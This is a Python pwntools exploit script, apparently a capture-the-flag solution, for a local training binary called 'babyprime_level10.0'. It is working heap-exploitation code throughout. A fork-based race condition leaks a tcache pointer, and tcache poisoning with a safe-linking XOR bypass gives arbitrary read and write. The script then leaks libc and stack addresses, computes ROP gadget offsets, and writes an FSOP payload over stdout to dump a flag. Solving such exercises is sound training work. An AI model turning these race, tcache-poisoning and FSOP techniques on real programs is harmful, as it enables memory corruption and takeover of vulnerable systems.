import time 
from pwn import *
import os

idx = 1

	
def leak_tcache(r1, r2):
	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
	
	# os.fork() == 0 is the child, child does the following
		for _ in range(10000):
			r1.sendline(b"malloc 0")
			r1.sendline(b"scanf 0")
			r1.sendline(b"AAAABBBB")
			r1.sendline(b"free 0") # hope for write() of printf to go right after this
		exit(0) # kills the child
		
	# else, parent (os.fork() returns pid
	else:
		for _ in range(10000):
			r2.sendline(b"printf 0")
		os.wait() # waits for the child to finish
	output_set = set(r2.clean().splitlines())
	# .clean() gets the output
	# .splitlines() split the output by lines
	# set() gets the unique lines
	print(output_set)
	for output in output_set:
		output = output[9:]
		if output[:1] != b'\x41' and b'\x07' in output: # for bytes object, output[i] outputs integer
			result = output[:6]
			print(result)
			return u64(result.ljust(8, b'\x00'))
	
	return 0

def controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	r1.clean()
	r2.clean()
	
	
	addr_packed = p64(addr ^ heap_base_addr)
	xor_result = addr ^ heap_base_addr
	print(f"addr: {hex(addr)}")
	print(f"heap_base: {hex(heap_base_addr)}")  
	print(f"XOR result: {hex(xor_result)}")
	
	
	r1.sendline(f"malloc 0".encode()) # chunk B
	r1.sendline(f"malloc {idx}".encode()) # chunk B
	r1.sendline(f"free {idx}".encode()) # free B
	
	while True:
		#print("Running Arbitrary Read on Address: ", hex(addr))
		if os.fork() == 0:
			r1.sendline(f"free 0".encode()) # free A
			os.kill(os.getpid(), 9)
		else:
			r2.send((f"scanf 0 ".encode() + addr_packed + b"\n") * 2000)
			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
			# overwriting freed A's next pointer to be the target address
			os.wait()
		
		time.sleep(0.1)
		
		r1.sendline(f"malloc 0".encode()) # this malloc gets A
		r1.sendline(f"printf 0".encode())
		r1.readuntil(b"MESSAGE: ")
		stored = r1.readline()[:-1] #

		
		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
			break

	r1.sendline(f"malloc {idx}".encode()) # gets B (returned at injected address's location
	#if debug:
	#	gdb.attach(p, s)
	#	print(f"{idx}")
	#	r1.interactive()
	r1.sendline(f"free 0".encode())
	r1.clean()
	idx += 1

def arbitrary_read(r1, r2, addr, heap_base_addr, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	
	r1.sendline(f"printf {idx - 1}".encode())
	
	r1.readuntil(b"MESSAGE: ")
	output = r1.readline()[:-1]
	leak = u64(output.ljust(8, b'\x00')) 
	return leak

def arbitrary_write(r1, r2, addr, heap_base_addr, content, debug, p, s):
	global idx
	controlled_allocations(r1, r2, addr, heap_base_addr, debug, p, s)
	if debug:
		gdb.attach(p, s)
		pause()
		r1.sendline(f"scanf {idx - 1}".encode())
		r1.sendline(content)
		r1.interactive()
	r1.sendline(f"scanf {idx - 1}".encode())
	r1.sendline(content)
#	r1.interactive()
	
	
	
def exploit(r1, r2, p):
	s = '''
	b * fwrite
	b * fwrite+71
	b * fwrite+189 
	b * setcontext+61
	b * _IO_wfile_overflow
	b * _IO_2_1_stdout_

	
	'''
	
	leak = leak_tcache(r1, r2)
	
	if leak:
		print("tcache next pointer: ", hex(leak))
		
		# pivoting around memory, so we need to leak many times
		
		location1 = ((leak & ~0xff) << 12) + 0x8a0
		print(hex(location1))
		
		libc_leak = arbitrary_read(r1, r2, location1, leak, 0, p, s)
				
		print("libc leak leak: ", hex(libc_leak))
		
		location2 = libc_leak + 0x60	
		leak3 = arbitrary_read(r1, r2, location2, leak, 0, p, s) # pivot 
		
		location3 = leak3 - 0x250
		stack_leak = arbitrary_read(r1, r2, location3, leak, 0, p, s)
		print("stack_leak: ", hex(stack_leak))
	

		rbp_addr = stack_leak - 0x810
		libc_base = libc_leak - 0x219c80
		random_pointer = stack_leak - 0xd80 - 0x20 - 0x90
		# gadgets
		pop_rdi = libc_base + 0x000000000002a3e5 # rop chain
		pop_rsi = libc_base + 0x000000000002be51 # rop chain
		pop_rdx = libc_base + 0x00000000000796a2 # rop chain
		
		libc = p.elf.libc
		
		contains_IO_wfile_overflow = libc_base + 0x2160d8 # fsop
		mprotect_addr = libc_base + libc.symbols['mprotect'] # rop chain
		
		
		shellcode_addr = (leak << 12) + 0x3000 # rop chain
		fake_wide_data_addr = ((leak & ~0xff) << 12) + 0x1000 # fsop 
		_IO_2_1_stdout_ = ((leak & ~0xff) << 12) + 0xd50 # fsop 
		flag_addr = ((leak & ~0xff) << 12) + 0x1110
		setcontext = libc_base + 0x539e0 + 61 # fsop
		
		
	
		

		
			
		

		
		fsop_payload = b'\x00' * 0x20
		
		offset_to_write_base = 0x8 * 1 # 0x0
		fsop_payload = p64(0x800) # 0x8
		fsop_payload += b"\x00" * offset_to_write_base  # 0x30
		fsop_payload += p64(flag_addr) # 0x38
		fsop_payload += p64(0) # 0x40
		fsop_payload += p64(flag_addr) # 0x48
		fsop_payload += p64(flag_addr+0x120) # 0x50
		fsop_payload += b'\x00' * (0x8 * 8) #0x58
		fsop_payload += p64(1) #0x60 _fileno = 1, stdout
		fsop_payload += p64(0) # 0x68
		fsop_payload += p64(0) # 0x70
		fsop_payload += p64(random_pointer - 8) # 0x78
		
		

		
		badchars = b"\x09\x0a\x0b\x0c\x0d\x0e\x20"

		print(f"Checking bad chars (whitespaces)")
		
			
		if any(bad in fsop_payload for bad in badchars):
			print("WARNING: fsop_payload contains bad characters!")
			print(f"fsop_payload hex: {fsop_payload.hex()}")
		
		#arbitrary_write(r1, r2, shellcode_addr, leak, payload, 0, p, s)
		
		#arbitrary_write(r1, r2, fake_wide_data_addr, leak, fake_wide_data, 0, p, s)
		
		arbitrary_write(r1, r2, _IO_2_1_stdout_, leak, fsop_payload, 0, p, s)
		
		#gdb.attach(p, s)
		#pause()
		#r1.sendline(b"haha")	
		#r1.interactive()	
		
		
		try:
			r1.clean()
			r2.clean()
			p.clean()

			r1.sendline(b"haha")

			response = p.recvall(timeout=2)
			print(response)
		except Exception as e:
			print(f"Final command execution failed: {e}")	
		
		return True
	else:
		print("Failed to leak")
		return False
	
def main(): 
	attempt = 0 
	while True:
		print(f"\nAttempt {attempt + 1}")
		
		global idx 
		idx = 2
		
		try: # code that might fail 
			binary = './babyprime_level10.0'
			p = process(binary)
			r1 = remote("localhost", 1337, timeout = 1)
			r2 = remote("localhost", 1337, timeout = 1)

			if exploit(r1, r2, p):
				break 
		except Exception as e: # what does the program do when `try` fails
			print(f"Error in attempt {attempt + 1}: {e}")
		finally: # code that always run no matter what
			try:
				r1.close()
				r2.close()
				p.kill()
			except:
				pass
		attempt += 1
	

if __name__ == "__main__":
	main()
